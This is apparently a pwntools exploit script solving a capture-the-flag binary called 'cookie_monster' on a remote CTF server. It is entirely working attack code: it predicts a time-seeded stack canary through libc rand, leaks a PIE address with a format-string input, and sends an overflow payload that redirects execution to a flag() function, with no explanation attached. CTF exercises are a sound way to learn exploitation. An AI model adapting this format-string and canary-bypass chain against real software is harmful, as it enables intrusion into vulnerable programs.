# exploit_cookie_monster.py

from pwn import *
from ctypes import *
from ctypes.util import *

# r = process("./cookie_monster")
r = remote("ctf.umbccd.io", 4200)

offset_ret = 0x134f # original return address - PIE base
offset_flag = 0x11b5 # address of flag() - PIE base

libc = CDLL(find_library('c'))
seed = libc.time(0)
libc.srand(seed)
canary = libc.rand()

print(hex(canary))

r.recvuntil("Oh hello there, what's your name?\n")
r.sendline("%11$p")
r.recvuntil("Hello, 0x")

pie = int(r.recvline()[:-1], 16) - offset_ret # PIE base
flag = pie + offset_flag # address of flag()
print("address of flag(): " + hex(flag))

payload = "A" * 0xd # dummy
payload += p32(canary)
payload += "A" * 0x8 # dummy
payload += p64(flag)

r.recvuntil("Would you like a cookie?\n")
r.sendline(payload)

r.interactive()